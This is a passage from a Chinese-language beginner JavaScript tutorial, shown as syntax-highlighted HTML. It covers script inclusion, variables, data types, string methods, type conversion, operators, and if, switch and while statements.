class="code"><pre><code class="hljs html">1 直接编写<br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;hello yuan&#x27;</span>)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>2 导入文件<br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;hello.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="8e94ebd0"></a></p><h2 id="4-3、JS基本语法"><a href="#4-3、JS基本语法" class="headerlink" title="4.3、JS基本语法"></a>4.3、JS基本语法</h2><p>js是一门弱类型的编程语言,属于基于对象和基于原型的脚本语言.</p><ul><li>变量</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">格式:<br>  <span class="hljs-comment">// 方式1 先声明再赋值</span><br>  <span class="hljs-keyword">var</span> 变量名;   <span class="hljs-comment">// 声明的变量如果没有进行赋值,或者没有被定义的变量,值默认是undefined</span><br>      变量名 = 变量值;<br><br>  <span class="hljs-comment">// 方式2 声明并赋值</span><br>      <span class="hljs-keyword">var</span> 变量名 = 变量值;<br><br>    <span class="hljs-comment">// 方式3 一行可以声明多个变量.并且可以是不同类型</span><br>    <span class="hljs-keyword">var</span> name=<span class="hljs-string">&quot;yuan&quot;</span>, age=<span class="hljs-number">20</span>, job=<span class="hljs-string">&quot;lecturer&quot;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>1、声明变量时 可以不用var. 如果不用var 那么它是全局变量</p><p>2、变量命名,首字符只能是字母,下划线,$美元符 三选一，余下的字符可以是下划线、美元符号或任何字母或数字字符且区分大小写</p></blockquote><ul><li>注释</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 单行注释</span><br><br> <span class="hljs-comment">/*</span><br><span class="hljs-comment">   多行注释</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><ul><li>语句分隔符</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;   <span class="hljs-comment">// 分号和换行符作为语句分隔符号</span><br><span class="hljs-keyword">var</span> b = <span class="hljs-number">2</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a,b);<br></code></pre></td></tr></table></figure><p><a name="aae817da"></a></p><h2 id="4-4、JS-基本数据类型"><a href="#4-4、JS-基本数据类型" class="headerlink" title="4.4、JS 基本数据类型"></a>4.4、JS 基本数据类型</h2><p><a name="1f343fc2"></a></p><h3 id="4-4-1、数字类型"><a href="#4-4-1、数字类型" class="headerlink" title="4.4.1、数字类型"></a>4.4.1、数字类型</h3><p>JavaScript 没有整型和浮点型，只有一种数字类型，即number类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">var</span> y = <span class="hljs-number">3.14</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x,<span class="hljs-keyword">typeof</span> x);  <span class="hljs-comment">// 10 &quot;number&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y,<span class="hljs-keyword">typeof</span> y);  <span class="hljs-comment">// 3.14 &quot;number&quot;</span><br></code></pre></td></tr></table></figure><p><a name="4b7911ac"></a></p><h3 id="4-4-2、字符串"><a href="#4-4-2、字符串" class="headerlink" title="4.4.2、字符串"></a>4.4.2、字符串</h3><p>字符串创建(两种方式)</p><ul><li>变量 &#x3D; “字符串”</li><li>字串对象名称 &#x3D; new String (字符串)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> str1=<span class="hljs-string">&quot;hello world&quot;</span>; <span class="hljs-comment">//推荐</span><br><span class="hljs-keyword">var</span> str1= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hello word&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 字符串对象的操作</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;hello&quot;</span>; <span class="hljs-comment">// 这就是字符串对象</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str);<br><br><span class="hljs-comment">// 字符串对象内置属性</span><br><span class="hljs-comment">// length 计算字符串的长度</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( str.<span class="hljs-property">length</span> );<br><br><span class="hljs-comment">// 字符串对象内置方法</span><br><span class="hljs-comment">// toUpperCase();  字母大写转换</span><br><span class="hljs-comment">// toLowerCase();  字母小写转换</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( str.<span class="hljs-title function_">toUpperCase</span>() );<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( str.<span class="hljs-title function_">toLowerCase</span>() );<br><br><span class="hljs-comment">// indexOf 获取指定字符在字符串中第一次出现的索引位置</span><br><span class="hljs-comment">// 字符串也有下标,也可以使用中括号来提取字符串的指定字符</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str[<span class="hljs-number">1</span>]); <span class="hljs-comment">// e</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( str.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;e&quot;</span>) ); <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">// match  正则匹配</span><br><span class="hljs-comment">// js中也存在正则,正则的使用符号和python里面是一样的</span><br><span class="hljs-comment">//语法：/正则表达式主体/修饰符(可选)</span><br><span class="hljs-comment">//修饰符：</span><br><span class="hljs-comment">//i:执行对大小写不敏感的匹配。</span><br><span class="hljs-comment">//g:执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</span><br><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;我的电话是: 13312345678,你的电话: 13512345678&quot;</span>;<br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/\d&#123;11&#125;/g</span>); <span class="hljs-comment">// 匹配,提取数据</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret);<br><br><span class="hljs-comment">// replace  正则替换</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;我的电话是: 13512345678&quot;</span>;<br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\d&#123;3&#125;)\d&#123;4&#125;(\d&#123;4&#125;)/</span>,<span class="hljs-string">&quot;$1****$2&quot;</span>); <span class="hljs-comment">// 正则 的 捕获模式  $1$2表示的正则中第一个和第二个小括号捕获的内容</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret);<br><span class="hljs-comment">// search  正则查找,如果查找不到,则返回-1</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">search</span>(<span class="hljs-regexp">/l/</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret);<br><br><span class="hljs-comment">// 切片,当前方法支持使用负数代表倒数下标</span><br><span class="hljs-comment">// slice(开始下标)   从开始位置切到最后</span><br><span class="hljs-comment">// slice(开始下标,结束下标)  从开始下标切到指定位置之前</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;helloworld&quot;</span>;<br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>); <span class="hljs-comment">// 开区间,不包含结束下标的内容</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret); <span class="hljs-comment">// low</span><br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret); <span class="hljs-comment">// world</span><br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret); <span class="hljs-comment">// lloworl</span><br><br><br><span class="hljs-comment">// split   正则分割,经常用于把字符串转换成数组</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;广东-深圳-南山&quot;</span>;<br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;-&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( ret );<br><br><span class="hljs-comment">// substr  截取</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;hello world&quot;</span>;<br><span class="hljs-keyword">var</span> ret = str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret); <span class="hljs-comment">// hel</span><br><br><span class="hljs-comment">// trim    移除字符串首尾空白</span><br><span class="hljs-keyword">var</span> password = <span class="hljs-string">&quot;    ge llo   &quot;</span>;<br><span class="hljs-keyword">var</span> ret = password.<span class="hljs-title function_">trim</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(password.<span class="hljs-property">length</span>); <span class="hljs-comment">// 13</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret.<span class="hljs-property">length</span>);  <span class="hljs-comment">// 6</span><br></code></pre></td></tr></table></figure><p><a name="cfb6a3fd"></a></p><h3 id="4-4-3、布尔值"><a href="#4-4-3、布尔值" class="headerlink" title="4.4.3、布尔值"></a>4.4.3、布尔值</h3><blockquote><p>1、Boolean类型仅有两个值：true和false，也代表1和0，实际运算中true&#x3D;1,false&#x3D;0<br>2、Boolean值主要用于JavaScript的控制语句</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">true</span> == <span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">true</span> + <span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">false</span> + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><a name="b1dc288d"></a></p><h3 id="4-4-4、空值（Undefined和Null）"><a href="#4-4-4、空值（Undefined和Null）" class="headerlink" title="4.4.4、空值（Undefined和Null）"></a>4.4.4、空值（Undefined和Null）</h3><ul><li>undefined类型</li></ul><p>undefined类型只有一个值，即 undefined。</p><p>(1) 当声明的变量未初始化时，该变量的默认值是 undefined。</p><p>(2)当函数无明确返回值时，返回的也是值 undefined;</p><ul><li>null类型</li></ul><p>另一种只有一个值的类型是 null，它只有一个专用值 null，即它的字面量。值 undefined 实际上是从值 null 派生来的，因此 js 把它们定义为相等的。</p><p>尽管这两个值相等，但它们的含义不同。undefined 是声明了变量但未对其初始化时赋予该变量的值，null 则用于表示尚未存在的对象。如果函数或方法要返回的是对象，那么找不到该对象时，返回的通常是 null。</p><p><a name="630520ae"></a></p><h3 id="4-4-5、类型转换"><a href="#4-4-5、类型转换" class="headerlink" title="4.4.5、类型转换"></a>4.4.5、类型转换</h3><p>js中,类型转换有2种.一种就是强制转换,一种就是自动转换.</p><blockquote><p>因为js是一门弱类型的脚本语言,所以变量会在运算符的运行要求,有时候根据运算符的要求,进行自动转换的.</p></blockquote><ul><li>强制转换</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-comment">// 1. 转换数据为数值类型</span><br><span class="hljs-comment">// parseInt     把数据转换成整数</span><br><span class="hljs-comment">// parseFloat   把数据转换成小数</span><br><span class="hljs-keyword">var</span> box1 = <span class="hljs-string">&quot;100&quot;</span>;     <span class="hljs-comment">// 转换会成功</span><br><span class="hljs-keyword">var</span> ret = <span class="hljs-built_in">parseInt</span>(box1);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(box1);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret);<br><span class="hljs-comment">//</span><br><span class="hljs-keyword">var</span> box2 = <span class="hljs-string">&quot;3.14&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-built_in">parseFloat</span>(box2) ); <span class="hljs-comment">// 3.14</span><br><span class="hljs-comment">// 对于转换数值,如果转换失败的话,则结果为 NaN ,是 Not a Number ,但是NaN的类型也是number类型</span><br><br><span class="hljs-comment">// 2. 转换数据为字符串</span><br>  <span class="hljs-comment">// 变量.toString()</span><br>  <span class="hljs-comment">// String(数据)</span><br><span class="hljs-keyword">var</span> box4 = <span class="hljs-number">3.14</span>;<br><span class="hljs-keyword">var</span> ret = box4.<span class="hljs-title function_">toString</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret);<br></code></pre></td></tr></table></figure><ul><li>自动转换</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 所谓的自动转换,其实弱类型中的变量会根据当前代码的需要,进行类型的自动隐式转化</span><br><span class="hljs-keyword">var</span> box1 = <span class="hljs-number">1</span> + <span class="hljs-literal">true</span>;<br><span class="hljs-comment">// true 转换成数值,是1, false转换成数值,是0</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(box1); <span class="hljs-comment">// 2</span><br><br><span class="hljs-keyword">var</span> box2 = <span class="hljs-number">1</span> + <span class="hljs-string">&quot;200&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(box2); <br><span class="hljs-comment">// ‘1200’ 原因是,程序中+的含义有2种,第一: 两边数值相加, 第二: 两边字符串拼接.但是在js中运算符的优先级中, 字符串拼接的优先级要高于正数    </span><br><span class="hljs-comment">// 值的加减乘除,所以解析器优先使用了+号作为了字符串的拼接符号了,因为程序就需要+号两边都是字符串才能完成运算操作,因此1变成字符串了。最终的结果就是 &quot;1&quot; +&quot;200&quot;</span><br><br><span class="hljs-keyword">var</span> box3 = <span class="hljs-number">1</span> - <span class="hljs-string">&quot;200&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(box3); <span class="hljs-comment">// -199;因为-号中表示的就是左边的数值减去右边的数值,因此程序就会要求&quot;200&quot;是数值,因此内部偷偷的转换了一下</span><br></code></pre></td></tr></table></figure><p><a name="bc77a990"></a></p><h3 id="4-4-6、原始值和引用值"><a href="#4-4-6、原始值和引用值" class="headerlink" title="4.4.6、原始值和引用值"></a>4.4.6、原始值和引用值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 初始值类型</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;yuan&quot;</span>;<br><span class="hljs-keyword">var</span> b = a;<br>a = <span class="hljs-string">&quot;alvin&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);<span class="hljs-comment">//alvin</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);<span class="hljs-comment">//yuan</span><br><br><span class="hljs-comment">// 对象类型</span><br><span class="hljs-keyword">var</span> arr1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>];<br>arr2 = arr1;<br>arr1.<span class="hljs-title function_">push</span>(<span class="hljs-number">3</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr1)<span class="hljs-comment">// [1,2,3]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2);<span class="hljs-comment">//[1,2,3]</span><br><br>arr1=[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr1);<span class="hljs-comment">//[4,5]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2);<span class="hljs-comment">//[1,2,3]</span><br></code></pre></td></tr></table></figure><p><a name="ce095c2f"></a></p><h2 id="4-5、运算符"><a href="#4-5、运算符" class="headerlink" title="4.5、运算符"></a>4.5、运算符</h2><ul><li>运算符</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">//算术运算符</span><br><span class="hljs-comment">   +   数值相加</span><br><span class="hljs-comment">   -   数值相减</span><br><span class="hljs-comment">   *   数值相乘</span><br><span class="hljs-comment">   /   数值相除</span><br><span class="hljs-comment">   %   数值求余</span><br><span class="hljs-comment">   **  数值求幂</span><br><span class="hljs-comment">   a++ 变量被使用后自增1 </span><br><span class="hljs-comment">     var a = 10</span><br><span class="hljs-comment">     print(a++) 输出结果为10</span><br><span class="hljs-comment">     print(a) 就是11</span><br><span class="hljs-comment">   ++a 变量被使用前自增1  </span><br><span class="hljs-comment">     var b = 10</span><br><span class="hljs-comment">     print(++b) 输出的就是11</span><br><span class="hljs-comment">   b-- 变量被使用后自减1   </span><br><span class="hljs-comment">   --b 变量被使用前自减1   </span><br><span class="hljs-comment">   </span><br><span class="hljs-comment">//赋值运算符</span><br><span class="hljs-comment">   =</span><br><span class="hljs-comment">   +=</span><br><span class="hljs-comment">   -=</span><br><span class="hljs-comment">   *=</span><br><span class="hljs-comment">   /=</span><br><span class="hljs-comment">   %=</span><br><span class="hljs-comment">   **=</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//比较运算符,比较的结果要么是true, 要么是false</span><br><span class="hljs-comment">&gt;   大于</span><br><span class="hljs-comment">&lt;   小于</span><br><span class="hljs-comment">&gt;=  大于或者等于</span><br><span class="hljs-comment">&lt;=  小于或者等于</span><br><span class="hljs-comment">!=  不等于[计算数值]</span><br><span class="hljs-comment">==  等于[计算]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  !== 不全等[不仅判断数值,还会判断类型是否一致]</span><br><span class="hljs-comment">=== 全等[不仅判断数值,还会判断类型是否一致]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//逻辑运算符</span><br><span class="hljs-comment">  &amp;&amp;   并且  and    两边的运算结果为true,最终结果才是true</span><br><span class="hljs-comment">  ||   或者  or     两边的运算结果为false,最终结果才是false</span><br><span class="hljs-comment">  !    非    not    运算符的结果如果是true,则最终结果是false ,反之亦然.</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//条件运算符[三目运算符]</span><br><span class="hljs-comment"> 条件?true:false</span><br><span class="hljs-comment"> 例如:</span><br><span class="hljs-comment">      var age = 12;</span><br><span class="hljs-comment">        var ret = age&gt;=18?&quot;成年&quot;:&quot;未成年&quot;; </span><br><span class="hljs-comment">        console.log(ret);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p><a name="177a475d"></a></p><h2 id="4-6、流程控制语句"><a href="#4-6、流程控制语句" class="headerlink" title="4.6、流程控制语句"></a>4.6、流程控制语句</h2><p>编程语言的流程控制分为三种：</p><ul><li>顺序结构(从上向下顺序执行)</li><li>分支结构</li><li>循环结构</li></ul><p>之前我们学习的方式就是顺序执行，即代码的执行从上到下，一行行分别执行。</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;星期一&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;星期二&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;星期三&quot;</span>);<br></code></pre></td></tr></table></figure><p><a name="9ee4bca2"></a></p><h3 id="4-6-1、分支结构"><a href="#4-6-1、分支结构" class="headerlink" title="4.6.1、分支结构"></a>4.6.1、分支结构</h3><ul><li>if 分支语句</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span>(条件)&#123;<br>    <span class="hljs-comment">// 条件为true时,执行的代码</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(条件)&#123;<br>    <span class="hljs-comment">// 条件为true时,执行的代码</span><br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 条件为false时,执行的代码</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(条件<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-comment">// 条件1为true时,执行的代码</span><br>  &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(条件<span class="hljs-number">2</span>)&#123;<br>    <span class="hljs-comment">// 条件2为true时,执行的代码</span><br>  <br>  &#125;....<br>  <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 上述条件都不成立的时候,执行的代码</span><br>  &#125;<br></code></pre></td></tr></table></figure><ul><li>switch语句</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">switch</span>(条件)&#123;<br>      <span class="hljs-keyword">case</span> 结果<span class="hljs-number">1</span>:<br>           满足条件执行的结果是结果<span class="hljs-number">1</span>时,执行这里的代码..<br>           <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> 结果<span class="hljs-number">2</span>:<br>         满足条件执行的结果是结果<span class="hljs-number">2</span>时,执行这里的代码..<br>         <span class="hljs-keyword">break</span>;<br>      .....<br>      <span class="hljs-attr">default</span>:<br>           条件和上述所有结果都不相等时,则执行这里的代码<br>   &#125;<br><br><span class="hljs-keyword">switch</span>(<span class="hljs-string">&#x27;a&#x27;</span>):<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">//只会会执行case 1下面的xxx代码</span><br>  xxx<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>  xxx<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-attr">default</span>:<br>  xxx<br>  <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><blockquote><p>1、switch比if else更为简洁</p><p>2、执行效率更高。switch…case会生成一个跳转表来指示实际的case分支的地址，而这个跳转表的索引号与switch变量的值是相等的。从而，switch…case不用像if…else那样遍历条件分支直到命中条件，而只需访问对应索引号的表项从而到达定位分支的目的。</p><p>3、到底使用哪一个选择语句，代码环境有关，如果是范围取值，则使用if else语句更为快捷；如果是确定取值，则使用switch是更优方案。</p></blockquote><p><a name="a321a686"></a></p><h3 id="4-6-2、循环语句"><a href="#4-6-2、循环语句" class="headerlink" title="4.6.2、循环语句"></a>4.6.2、循环语句</h3><ul><li>while循环</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">while</span>(循环的条件)&#123;<br>   <span class="hljs-comment">// 循环条件为true的时候,会执行这里的代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>循环案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 